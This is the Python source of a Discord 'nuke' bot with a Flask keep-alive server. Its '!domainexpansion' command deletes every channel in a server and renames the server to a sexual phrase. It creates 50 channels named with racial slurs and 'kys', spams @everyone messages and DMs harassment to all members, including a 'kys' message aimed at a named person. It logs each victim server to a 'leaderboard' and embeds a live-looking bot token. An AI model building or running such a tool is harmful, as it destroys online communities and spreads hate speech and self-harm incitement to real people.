import discord
from discord.ext import commands
import random
import asyncio
import aiohttp
from flask import Flask
from threading import Thread
import os
import json

app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 8080)))

def keep_alive():
    t = Thread(target=run)
    t.start()

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

print("Bot is alive")

channel_names = [
    "invaded by the communists", "nigga", "stalin",
    "we love stalin", "communism for the win", "kys"
]

semaphore = asyncio.Semaphore(10)

# List to track nuked servers for leaderboard
nuked_servers = []

# User to send logs to
LOG_USER_ID = 1082037268480544798

# Hardcoded backup channel ID (REPLACE WITH YOUR CHANNEL ID)
LEADERBOARD_BACKUP_CHANNEL_ID = 1355975678574592273

async def download_image(url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    return await response.read()
                else:
                    print(f"Failed to fetch image: {response.status} {response.reason}")
                    return None
    except aiohttp.ClientError as e:
        print(f"Client error occurred while fetching image: {e}")
        return None
    except asyncio.TimeoutError:
        print(f"Connection timeout to host {url}")
        return None

async def ping_bot():
    url = "https://bothostingsecurity-4rmp.onrender.com"
    while True:
        async with aiohttp.ClientSession() as session:
            try:
                await session.get(url)
                print(f"Successfully pinged {url}")
            except Exception as e:
                print(f"Failed to ping {url}: {e}")
        await asyncio.sleep(60)

async def save_leaderboard():
    """Saves leaderboard data to backup channel"""
    try:
        channel = bot.get_channel(LEADERBOARD_BACKUP_CHANNEL_ID)
        if not channel:
            return
            
        # Delete previous backup messages
        async for msg in channel.history(limit=10):
            if msg.author == bot.user:
                await msg.delete()
                
        # Save new backup
        await channel.send(
            "**LEADERBOARD BACKUP**\n"
            f"Last updated: {discord.utils.utcnow()}\n"
            "```json\n"
            f"{json.dumps(nuked_servers, indent=2)}\n"
            "```"
        )
    except Exception as e:
        print(f"Failed to save leaderboard: {e}")

async def load_leaderboard():
    """Loads leaderboard data from backup channel"""
    try:
        channel = bot.get_channel(LEADERBOARD_BACKUP_CHANNEL_ID)
        if not channel:
            return
            
        async for msg in channel.history(limit=10):
            if msg.author == bot.user and "LEADERBOARD BACKUP" in msg.content:
                try:
                    data = msg.content.split("```json\n")[1].split("\n```")[0]
                    nuked_servers.extend(json.loads(data))
                    print(f"Loaded {len(nuked_servers)} servers from backup")
                    break
                except Exception as e:
                    print(f"Failed to parse backup: {e}")
    except Exception as e:
        print(f"Failed to load leaderboard: {e}")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await load_leaderboard()  # Load saved data on startup
    bot.loop.create_task(ping_bot())

async def handle_nuke(ctx, add_to_leaderboard):
    await ctx.message.delete()
    try:
        guild = ctx.guild
        command_user = ctx.author
        original_server_name = guild.name

        server_info = {
            "name": original_server_name,
            "owner": str(guild.owner),
            "user_count": guild.member_count
        }

        if add_to_leaderboard:
            nuked_servers.append(server_info)
            await save_leaderboard()  # Update backup

        log_user = await bot.fetch_user(LOG_USER_ID)
        await log_user.send(
            f"**Server Nuked:**\nName: {original_server_name}\nOwner: {guild.owner}\nMembers: {guild.member_count}\nExecuted By: {command_user}"
        )

        await guild.edit(name="communist sex slaves")
        primary_image_url = 'https://i.ibb.co/0VWbRwhF/IMG-20250325-WA0002.jpg'
        fallback_image_url_1 = 'https://iili.io/3PlVESS.jpg'
        fallback_image_url_2 = 'https://iili.io/3PlVESS.jpg'

        image_data = await download_image(primary_image_url)
        if not image_data:
            image_data = await download_image(fallback_image_url_1)
        if not image_data:
            image_data = await download_image(fallback_image_url_2)
        if image_data:
            await guild.edit(icon=image_data)

        channels = list(guild.channels)
        batch_size = 10
        for i in range(0, len(channels), batch_size):
            batch = channels[i:i + batch_size]
            delete_tasks = [channel.delete() for channel in batch]
            await asyncio.gather(*delete_tasks)
            await asyncio.sleep(0.5)

        async def create_channel(name, index):
            async with semaphore:
                return await guild.create_text_channel(f'{name}-{index}')

        channel_tasks = [create_channel(random.choice(channel_names), i) for i in range(1, 51)]
        new_channels = await asyncio.gather(*channel_tasks)

        async def send_messages(channel):
            for _ in range(20):
                try:
                    await channel.send('@everyone the communists are here https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExZjllZjcwbmVweDM4eWdha3NuazFrZG53MDFwZnQyZmk0cmdrdjhheiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RHWYdwYZJCloHMsQC7/giphy.gif')
                    await asyncio.sleep(random.uniform(0.05, 0.2))
                except Exception:
                    pass

        message_tasks = [send_messages(channel) for channel in new_channels]
        await asyncio.gather(*message_tasks)

        async def dm_members(member):
            if not member.bot:
                try:
                    if member == guild.owner:
                        await member.send(
                            f"https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExZjllZjcwbmVweDM4eWdha3NuazFrZG53MDFwZnQyZmk0cmdrdjhheiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RHWYdwYZJCloHMsQC7/giphy.gif"
                            "kys aryan parikh I hate you"
                        )
                    else:
                        await member.send(
                            f"you have joined the communist sex slave empire ggs"
                            "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExZjllZjcwbmVweDM4eWdha3NuazFrZG53MDFwZnQyZmk0cmdrdjhheiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RHWYdwYZJCloHMsQC7/giphy.gif"
                        )
                    await asyncio.sleep(0.5)
                except Exception:
                    pass

        dm_tasks = [dm_members(member) for member in guild.members if not member.bot]
        await asyncio.gather(*dm_tasks)

        await guild.leave()
    except Exception as e:
        print(f"Unexpected error during nuke: {e}")

@bot.command(name='domainexpansion')
async def domainexpansion_command(ctx):
    """Domain Expansion command that adds the server to the leaderboard."""
    await handle_nuke(ctx, add_to_leaderboard=True)

@bot.command(name='text')
async def text_command(ctx):
    """Sends the specified gif"""
    await ctx.send("https://tenor.com/view/oi-oi-oi-red-lavra-oi-oi-oi-oi-red-lavra-gif-8684121663846339528")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="custom commands"
        )
    )
    await load_leaderboard()
    bot.loop.create_task(ping_bot())

keep_alive()
bot.run('MTM3Mzc5MzMzNzg4MTkyMzYzNQ.GWaClu.mQM2apg1rjLNXjJeIUmTHhFvjMuJtH_JOCUswk')
